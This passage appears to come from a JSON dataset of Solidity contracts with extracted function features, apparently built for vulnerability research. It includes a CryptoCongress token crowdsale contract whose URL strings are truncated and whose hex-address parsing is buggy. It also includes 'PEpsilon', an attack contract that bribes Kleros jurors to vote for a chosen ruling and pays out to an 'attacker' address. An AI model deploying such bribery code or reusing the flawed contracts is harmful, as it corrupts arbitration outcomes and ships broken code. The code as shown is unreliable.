ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\n contract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n }\n contract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n }\n contract StandardToken is Token {\n uint256 public fundingEndBlock;\n function transfer(address _to, uint256 _value) returns (bool success) {\n require (block.number > fundingEndBlock);\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require (block.number > fundingEndBlock);\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require (block.number > fundingEndBlock);\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n }\n contract CryptoCongress is StandardToken, SafeMath, usingOraclize {\n mapping(bytes => uint256) initialAllotments;\n mapping(bytes32 => bytes) validQueryIds;\n string public constant name = \"CryptoCongress\";\n string public constant symbol = \"CC\";\n uint256 public constant decimals = 18;\n string public constant requiredPrefix = \"CryptoCongress \";\n string public constant a = \"html(https:\n string public constant b = \"/status/\";\n string public constant c = \").xpath(\n address public ethFundDeposit;\n uint256 public fundingStartBlock;\n uint256 public totalSupply = 0;\n uint256 public totalSupplyFromCrowdsale = 0;\n uint256 public constant tokenExchangeRate = 30;\n uint256 public constant tokenCreationCap = 131583 * (10**3) * 10**decimals;\n event InitialAllotmentRecorded(string username, uint256 initialAllotment);\n event newOraclizeQuery(string url);\n event newOraclizeCallback(string result, bytes proof);\n event InitialAllotmentClaimed(bytes username);\n event Proposal(string ID, string description, string data);\n event Vote(string proposalID, string vote, string data);\n function CryptoCongress (\n address _ethFundDeposit,\n uint256 _fundingStartBlock,\n uint256 _fundingEndBlock) payable\n {\n ethFundDeposit = _ethFundDeposit;\n fundingStartBlock = _fundingStartBlock;\n fundingEndBlock = _fundingEndBlock;\n oraclize_setProof(proofType_TLSNotary);\n }\n function createInitialAllotment(\n string username,\n uint256 initialAllotment)\n {\n require (msg.sender == ethFundDeposit);\n require (block.number < fundingStartBlock);\n initialAllotments[bytes(username)] = initialAllotment;\n InitialAllotmentRecorded(username, initialAllotment);\n }\n function claimInitialAllotment(string twitterStatusID, string username) payable {\n bytes memory usernameAsBytes = bytes(username);\n require (usernameAsBytes.length < 16);\n require (msg.value > 4000000000000000);\n require (block.number > fundingStartBlock);\n require (block.number < fundingEndBlock);\n require (initialAllotments[usernameAsBytes] > 0);\n string memory url = usingOraclize.strConcat(a,username,b,twitterStatusID,c);\n newOraclizeQuery(url);\n bytes32 queryId = oraclize_query(\"URL\",url);\n validQueryIds[queryId] = usernameAsBytes;\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n require (msg.sender == oraclize_cbAddress());\n newOraclizeCallback(result, proof);\n require (initialAllotments[validQueryIds[myid]] > 0);\n require (block.number > fundingStartBlock);\n require (block.number < fundingEndBlock);\n bytes memory resultBytes = bytes(result);\n require (resultBytes.length == 57);\n require (resultBytes[0] == 0x43);\n require (resultBytes[1] == 0x72);\n require (resultBytes[2] == 0x79);\n require (resultBytes[3] == 0x70);\n require (resultBytes[4] == 0x74);\n require (resultBytes[5] == 0x6f);\n require (resultBytes[6] == 0x43);\n require (resultBytes[7] == 0x6f);\n require (resultBytes[8] == 0x6e);\n require (resultBytes[9] == 0x67);\n require (resultBytes[10] == 0x72);\n require (resultBytes[11] == 0x65);\n require (resultBytes[12] == 0x73);\n require (resultBytes[13] == 0x73);\n require (resultBytes[14] == 0x20);\n require (resultBytes[15] == 0x30);\n require (resultBytes[16] == 0x78);\n uint addrUint = 0;\n for (uint i = resultBytes.length-1; i+1 > 15; i--) {\n uint d = uint(resultBytes[i]);\n uint to_inc = d * ( 15 ** ((resultBytes.length - i-1) * 2));\n addrUint += to_inc;\n }\n address addr = address(addrUint);\n uint256 tokenAllotment = initialAllotments[validQueryIds[myid]];\n uint256 checkedSupply = safeAdd(totalSupply, tokenAllotment);\n require (tokenCreationCap > checkedSupply);\n totalSupply = checkedSupply;\n initialAllotments[validQueryIds[myid]] = 0;\n balances[addr] += tokenAllotment;\n InitialAllotmentClaimed(validQueryIds[myid]);\n delete validQueryIds[myid];\n Transfer(0x0,addr,tokenAllotment);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(msg.value != 0);\n require (block.number > fundingStartBlock);\n require (block.number < fundingEndBlock);\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n uint256 checkedTotalSupply = safeAdd(totalSupply, tokens);\n uint256 checkedCrowdsaleSupply = safeAdd(totalSupplyFromCrowdsale, tokens);\n require (tokenCreationCap > checkedTotalSupply);\n require (safeMult(checkedCrowdsaleSupply, 3) < totalSupply);\n totalSupply = checkedTotalSupply;\n totalSupplyFromCrowdsale = checkedCrowdsaleSupply;\n balances[msg.sender] += tokens;\n Transfer(0x0, beneficiary, tokens);\n }\n function secureTransfer(uint256 amount) external {\n require (msg.sender == ethFundDeposit);\n assert (ethFundDeposit.send(amount));\n }\n function propose(string _ID, string _description, string _data) {\n require(bytes(_ID).length < 281 && bytes(_description).length < 281 && bytes(_data).length < 281);\n require (balances[msg.sender] > 70000000000000000000000);\n Proposal(_ID, _description, _data);\n }\n function vote(string _proposalID, string _vote, string _data) {\n require(bytes(_proposalID).length < 281 && bytes(_vote).length < 281 && bytes(_data).length < 281);\n require (balances[msg.sender] > 50000000000000000000000);\n Vote(_proposalID, _vote, _data);\n }\n function () payable {\n buyTokens(msg.sender);\n }\n }",
  "extract_feature": [
    "function transfer(address _to, uint256 _value) returns (bool success) {\nrequire (block.number > fundingEndBlock);\nif (balances[msg.sender] >= _value && _value > 0) {\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n} else {\nreturn false;\n}\n}",
    "function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\nrequire (block.number > fundingEndBlock);\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n} else {\nreturn false;\n}\n}",
    "function approve(address _spender, uint256 _value) returns (bool success) {\nrequire (block.number > fundingEndBlock);\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}",
    "function claimInitialAllotment(string twitterStatusID, string username) payable {\nbytes memory usernameAsBytes = bytes(username);\nrequire (usernameAsBytes.length < 16);\nrequire (msg.value > 4000000000000000);\nrequire (block.number > fundingStartBlock);\nrequire (block.number < fundingEndBlock);\nrequire (initialAllotments[usernameAsBytes] > 0);\nstring memory url = usingOraclize.strConcat(a,username,b,twitterStatusID,c);\nnewOraclizeQuery(url);\nbytes32 queryId = oraclize_query(\"URL\",url);\nvalidQueryIds[queryId] = usernameAsBytes;\n}",
    "function __callback(bytes32 myid, string result, bytes proof) {\nrequire (msg.sender == oraclize_cbAddress());\nnewOraclizeCallback(result, proof);\nrequire (initialAllotments[validQueryIds[myid]] > 0);\nrequire (block.number > fundingStartBlock);\nrequire (block.number < fundingEndBlock);\nbytes memory resultBytes = bytes(result);\nrequire (resultBytes.length == 57);\nrequire (resultBytes[0] == 0x43);\nrequire (resultBytes[1] == 0x72);\nrequire (resultBytes[2] == 0x79);\nrequire (resultBytes[3] == 0x70);\nrequire (resultBytes[4] == 0x74);\nrequire (resultBytes[5] == 0x6f);\nrequire (resultBytes[6] == 0x43);\nrequire (resultBytes[7] == 0x6f);\nrequire (resultBytes[8] == 0x6e);\nrequire (resultBytes[9] == 0x67);\nrequire (resultBytes[10] == 0x72);\nrequire (resultBytes[11] == 0x65);\nrequire (resultBytes[12] == 0x73);\nrequire (resultBytes[13] == 0x73);\nrequire (resultBytes[14] == 0x20);\nrequire (resultBytes[15] == 0x30);\nrequire (resultBytes[16] == 0x78);\nuint addrUint = 0;\nfor (uint i = resultBytes.length-1; i+1 > 15; i--) {\nuint d = uint(resultBytes[i]);\nuint to_inc = d * ( 15 ** ((resultBytes.length - i-1) * 2));\naddrUint += to_inc;\n}\naddress addr = address(addrUint);\nuint256 tokenAllotment = initialAllotments[validQueryIds[myid]];\nuint256 checkedSupply = safeAdd(totalSupply, tokenAllotment);\nrequire (tokenCreationCap > checkedSupply);\ntotalSupply = checkedSupply;\ninitialAllotments[validQueryIds[myid]] = 0;\nbalances[addr] += tokenAllotment;\nInitialAllotmentClaimed(validQueryIds[myid]);\ndelete validQueryIds[myid];\nTransfer(0x0,addr,tokenAllotment);\n}",
    "function buyTokens(address beneficiary) public payable {\nrequire(beneficiary != address(0));\nrequire(msg.value != 0);\nrequire (block.number > fundingStartBlock);\nrequire (block.number < fundingEndBlock);\nuint256 tokens = safeMult(msg.value, tokenExchangeRate);\nuint256 checkedTotalSupply = safeAdd(totalSupply, tokens);\nuint256 checkedCrowdsaleSupply = safeAdd(totalSupplyFromCrowdsale, tokens);\nrequire (tokenCreationCap > checkedTotalSupply);\nrequire (safeMult(checkedCrowdsaleSupply, 3) < totalSupply);\ntotalSupply = checkedTotalSupply;\ntotalSupplyFromCrowdsale = checkedCrowdsaleSupply;\nbalances[msg.sender] += tokens;\nTransfer(0x0, beneficiary, tokens);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b89"
  },
  "filename": "415.sol",
  "content": "contract PEpsilon {\n Pinakion public pinakion;\n Kleros public court;\n uint public balance;\n uint public disputeID;\n uint public desiredOutcome;\n uint public epsilon;\n bool public settled;\n uint public maxAppeals;\n mapping (address => uint) public withdraw;\n address public attacker;\n uint public remainingWithdraw;\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n event AmountShift(uint val, uint epsilon ,address juror);\n event Log(uint val, address addr, string message);\n constructor(Pinakion _pinakion, Kleros _kleros, uint _disputeID, uint _desiredOutcome, uint _epsilon, uint _maxAppeals) public {\n pinakion = _pinakion;\n court = _kleros;\n disputeID = _disputeID;\n desiredOutcome = _desiredOutcome;\n epsilon = _epsilon;\n attacker = msg.sender;\n maxAppeals = _maxAppeals;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n balance += _amount;\n }\n function withdrawJuror() {\n withdrawSelect(msg.sender);\n }\n function withdrawSelect(address _juror) {\n uint amount = withdraw[_juror];\n withdraw[_juror] = 0;\n balance = sub(balance, amount);\n remainingWithdraw = sub(remainingWithdraw, amount);\n require(pinakion.transfer(_juror, amount));\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function withdrawAttacker(){\n require(settled);\n if (balance > remainingWithdraw) {\n uint amount = balance - remainingWithdraw;\n balance = remainingWithdraw;\n require(pinakion.transfer(attacker, amount));\n }\n }\n function settle() public {\n require(court.disputeStatus(disputeID) == Arbitrator.DisputeStatus.Solved);\n require(!settled);\n settled = true;\n var (, , appeals, choices, , , ,) = court.disputes(disputeID);\n if (court.currentRuling(disputeID) != desiredOutcome){\n uint amountShift = court.getStakePerDraw();\n uint winningChoice = court.getWinningChoice(disputeID, appeals);\n for (uint i=0; i <= (appeals > maxAppeals ? maxAppeals : appeals); i++){\n if (winningChoice != 0){\n uint votesLen = 0;\n for (uint c = 0; c <= choices; c++) {\n votesLen += court.getVoteCount(disputeID, i, c);\n }\n emit Log(amountShift, 0x0 ,\"stakePerDraw\");\n emit Log(votesLen, 0x0, \"votesLen\");\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j=0; j < votesLen; j++){\n uint voteRuling = court.getVoteRuling(disputeID, i, j);\n address voteAccount = court.getVoteAccount(disputeID, i, j);\n emit Log(voteRuling, voteAccount, \"voted\");\n if (voteRuling != winningChoice){\n totalToRedistribute += amountShift;\n if (voteRuling == desiredOutcome){\n withdraw[voteAccount] += amountShift + epsilon;\n remainingWithdraw += amountShift + epsilon;\n emit AmountShift(amountShift, epsilon, voteAccount);\n }\n } else {\n nbCoherent++;\n }\n }\n uint toRedistribute = (totalToRedistribute - amountShift) / (nbCoherent + 1);\n for (j = 0; j < votesLen; j++){\n voteRuling = court.getVoteRuling(disputeID, i, j);\n voteAccount = court.getVoteAccount(disputeID, i, j);\n if (voteRuling == desiredOutcome){\n withdraw[voteAccount] += toRedistribute;\n remainingWithdraw += toRedistribute;\n emit AmountShift(toRedistribute, 0, voteAccount);\n }\n }\n }\n }\n }\n }\n}\npragma solidity ^0.4.24;\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract Pinakion is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Pinakion public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function Pinakion(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = Pinakion(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n Pinakion cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n Pinakion token = Pinakion(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (Pinakion) {\n Pinakion newToken = new Pinakion(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract RNG{\n function contribute(uint _block) public payable;\n function requestRN(uint _block) public payable {\n contribute(_block);\n }\n function getRN(uint _block) public returns (uint RN);\n function getUncorrelatedRN(uint _block) public returns (uint RN) {\n uint baseRN=getRN(_block);\n if (baseRN==0)\n return 0;\n else\n return uint(keccak256(msg.sender,baseRN));\n }\n }\ncontract BlockHashRNG is RNG {\n mapping (uint => uint) public randomNumber;\n mapping (uint => uint) public reward;\n function contribute(uint _block) public payable { reward[_block]+=msg.value; }\n function getRN(uint _block) public returns (uint RN) {\n RN=randomNumber[_block];\n if (RN==0){\n saveRN(_block);\n return randomNumber[_block];\n }\n else\n return RN;\n }\n function saveRN(uint _block) public {\n if (blockhash(_block) != 0x0)\n randomNumber[_block] = uint(blockhash(_block));\n if (randomNumber[_block] != 0) {\n uint rewardToSend = reward[_block];\n reward[_block] = 0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract BlockHashRNGFallback is BlockHashRNG {\n function saveRN(uint _block) public {\n if (_block<block.number && randomNumber[_block]==0) {\n if (blockhash(_block)!=0x0)\n randomNumber[_block]=uint(blockhash(_block));\n else\n randomNumber[_block]=uint(blockhash(block.number-1));\n }\n if (randomNumber[_block] != 0) {\n uint rewardToSend=reward[_block];\n reward[_block]=0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract Arbitrable{\n Arbitrator public arbitrator;\n bytes public arbitratorExtraData;\n modifier onlyArbitrator {require(msg.sender==address(arbitrator)); _;}\n event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);\n event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);\n event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID);\n event Evidence(Arbitrator indexed _arbitrator, uint indexed _disputeID, address _party, string _evidence);\n constructor(Arbitrator _arbitrator, bytes _arbitratorExtraData) public {\n arbitrator = _arbitrator;\n arbitratorExtraData = _arbitratorExtraData;\n }\n function rule(uint _disputeID, uint _ruling) public onlyArbitrator {\n emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling);\n executeRuling(_disputeID,_ruling);\n }\n function executeRuling(uint _disputeID, uint _ruling) internal;\n}\ncontract Arbitrator{\n enum DisputeStatus {Waiting, Appealable, Solved}\n modifier requireArbitrationFee(bytes _extraData) {require(msg.value>=arbitrationCost(_extraData)); _;}\n modifier requireAppealFee(uint _disputeID, bytes _extraData) {require(msg.value>=appealCost(_disputeID, _extraData)); _;}\n event AppealPossible(uint _disputeID);\n event DisputeCreation(uint indexed _disputeID, Arbitrable _arbitrable);\n event AppealDecision(uint indexed _disputeID, Arbitrable _arbitrable);\n function createDispute(uint _choices, bytes _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID) {}\n function arbitrationCost(bytes _extraData) public constant returns(uint fee);\n function appeal(uint _disputeID, bytes _extraData) public requireAppealFee(_disputeID,_extraData) payable {\n emit AppealDecision(_disputeID, Arbitrable(msg.sender));\n }\n function appealCost(uint _disputeID, bytes _extraData) public constant returns(uint fee);\n function disputeStatus(uint _disputeID) public constant returns(DisputeStatus status);\n function currentRuling(uint _disputeID) public constant returns(uint ruling);\n}\ncontract Kleros is Arbitrator, ApproveAndCallFallBack {\n Pinakion public pinakion;\n uint public constant NON_PAYABLE_AMOUNT = (2**256 - 2) / 2;\n RNG public rng;\n uint public arbitrationFeePerJuror = 0.05 ether;\n uint16 public defaultNumberJuror = 3;\n uint public minActivatedToken = 0.1 * 1e18;\n uint[5] public timePerPeriod;\n uint public alpha = 2000;\n uint constant ALPHA_DIVISOR = 1e4;\n uint public maxAppeals = 5;\n address public governor;\n uint public session = 1;\n uint public lastPeriodChange;\n uint public segmentSize;\n uint public rnBlock;\n uint public randomNumber;\n enum Period {\n Activation,\n Draw,\n Vote,\n Appeal,\n Execution\n }\n Period public period;\n struct Juror {\n uint balance;\n uint atStake;\n uint lastSession;\n uint segmentStart;\n uint segmentEnd;\n }\n mapping (address => Juror) public jurors;\n struct Vote {\n address account;\n uint ruling;\n }\n struct VoteCounter {\n uint winningChoice;\n uint winningCount;\n mapping (uint => uint) voteCount;\n }\n enum DisputeState {\n Open,\n Resolving,\n Executable,\n Executed\n }\n struct Dispute {\n Arbitrable arbitrated;\n uint session;\n uint appeals;\n uint choices;\n uint16 initialNumberJurors;\n uint arbitrationFeePerJuror;\n DisputeState state;\n Vote[][] votes;\n VoteCounter[] voteCounter;\n mapping (address => uint) lastSessionVote;\n uint currentAppealToRepartition;\n AppealsRepartitioned[] appealsRepartitioned;\n }\n enum RepartitionStage {\n Incoherent,\n Coherent,\n AtStake,\n Complete\n }\n struct AppealsRepartitioned {\n uint totalToRedistribute;\n uint nbCoherent;\n uint currentIncoherentVote;\n uint currentCoherentVote;\n uint currentAtStakeVote;\n RepartitionStage stage;\n }\n Dispute[] public disputes;\n event NewPeriod(Period _period, uint indexed _session);\n event TokenShift(address indexed _account, uint _disputeID, int _amount);\n event ArbitrationReward(address indexed _account, uint _disputeID, uint _amount);\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n modifier onlyDuring(Period _period) {require(period == _period); _;}\n modifier onlyGovernor() {require(msg.sender == governor); _;}\n constructor(Pinakion _pinakion, RNG _rng, uint[5] _timePerPeriod, address _governor) public {\n pinakion = _pinakion;\n rng = _rng;\n lastPeriodChange = now;\n timePerPeriod = _timePerPeriod;\n governor = _governor;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n jurors[_from].balance += _amount;\n }\n function withdraw(uint _value) public {\n Juror storage juror = jurors[msg.sender];\n require(juror.atStake <= juror.balance);\n require(_value <= juror.balance-juror.atStake);\n require(juror.lastSession != session);\n juror.balance -= _value;\n require(pinakion.transfer(msg.sender,_value));\n }\n function passPeriod() public {\n require(now-lastPeriodChange >= 